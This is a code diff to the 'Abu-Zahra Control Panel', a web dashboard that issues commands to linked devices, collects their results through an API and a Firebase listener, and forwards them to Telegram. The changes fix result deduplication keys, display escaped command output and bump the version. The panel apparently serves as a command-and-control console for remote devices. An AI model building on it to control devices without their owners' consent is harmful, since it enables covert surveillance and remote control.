@@ -1844,7 +1844,7 @@ async def api_command_result(request):
             update_device(device_id, {"active": True})
 
         # === FORWARD RESULT TO TELEGRAM ===
-        result_key = f"api:{cmd_id}"
+        result_key = f"result:{cmd_id}"
         if result_key not in _processed_results:
             _processed_results.add(result_key)
             try:
@@ -2413,7 +2413,7 @@ th{color:var(--text2);font-weight:500}
 
 <div class="app" id="app">
 <nav class="sidebar" id="sidebar">
-<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.4</span></div>
+<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.6</span></div>
 <a class="active" onclick="showPage('dashboard')">📊 Dashboard</a>
 <a onclick="showPage('devices')">📱 Devices</a>
 <a onclick="showPage('commands')">🎮 Commands</a>
@@ -2634,7 +2634,7 @@ detail.innerHTML=`
 <div><span style="color:var(--text2)">Last Seen:</span> ${d.last_seen||'-'}</div>
 </div>
 <h3>📋 Recent Commands</h3>
-${cmds.length?cmds.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">${c.created_at} | ID: ${c.id}</div></div>`).join(''):'<div class="empty">No commands</div>'}
+${cmds.length?cmds.map(c=>{let rHtml='';if(c.result){const rs=typeof c.result==='string'?c.result:JSON.stringify(c.result);rHtml=`<div style="margin-top:4px;padding:6px;background:var(--bg);border-radius:6px;font-size:11px;color:var(--text);white-space:pre-wrap;word-break:break-all;max-height:150px;overflow-y:auto">${escHtml(rs.length>300?rs.slice(0,300)+'...':rs)}</div>`;}return`<div class="cmd-item"><div class="cmd-header"><span>${escHtml(c.command)}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':c.status==='error'?'red':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">${c.created_at||''} | ID: ${c.id}</div>${rHtml}</div>`;}).join(''):'<div class="empty">No commands</div>'}
 <button class="btn btn-danger btn-sm" onclick="unlinkDevice('${d.id}')" style="margin-top:16px">🗑️ Unlink Device</button>`;
 detail.scrollIntoView({behavior:'smooth'});
 }catch(e){}
@@ -2715,10 +2715,23 @@ const el=document.getElementById('cmdLog');
 const dash=document.getElementById('dashCommands');
 const items=(cmds||[]).slice(-20).reverse();
 if(!items.length){el.innerHTML='<div class="empty">No commands</div>';dash.innerHTML='';return;}
-const html=items.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">Device: ${c.device_id} | ${c.created_at}</div></div>`).join('');
+const html=items.map(c=>{
+let resultHtml='';
+if(c.result){
+const resStr=typeof c.result==='string'?c.result:JSON.stringify(c.result);
+const truncated=resStr.length>500?resStr.slice(0,500)+'...':resStr;
+resultHtml=`<div class="cmd-result" style="margin-top:6px;padding:8px;background:var(--bg);border-radius:6px;font-size:12px;color:var(--text);white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto">${escHtml(truncated)}</div>`;
+if(resStr.length>500){
+const fullEsc=escHtml(resStr);
+resultHtml+=`<button class="btn btn-sm btn-secondary" style="margin-top:4px" onclick="this.previousElementSibling.textContent=decodeURIComponent('${encodeURIComponent(resStr)}');this.previousElementSibling.style.maxHeight='600px';this.style.display='none'">Show All</button>`;
+}
+}
+return`<div class="cmd-item"><div class="cmd-header"><span>${escHtml(c.command)}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':c.status==='error'?'red':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">Device: ${escHtml(c.device_id)} | ${c.created_at||''}</div>${resultHtml}</div>`;
+}).join('');
 el.innerHTML=html;
 dash.innerHTML=html;
 }
+function escHtml(s){if(typeof s!=='string')return'';return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
 
 async function loadEvents(){
 const r=await api('web/events');
@@ -2925,7 +2938,7 @@ async def firebase_result_listener():
                     status = result_entry.get("status", "completed")
 
                     # Simple dedup by cmd_id (not content hash - prevents delete failures)
-                    result_key = f"{device_id}:{cmd_id}"
+                    result_key = f"result:{cmd_id}"
 
                     if result_key in _processed_results:
                         continue
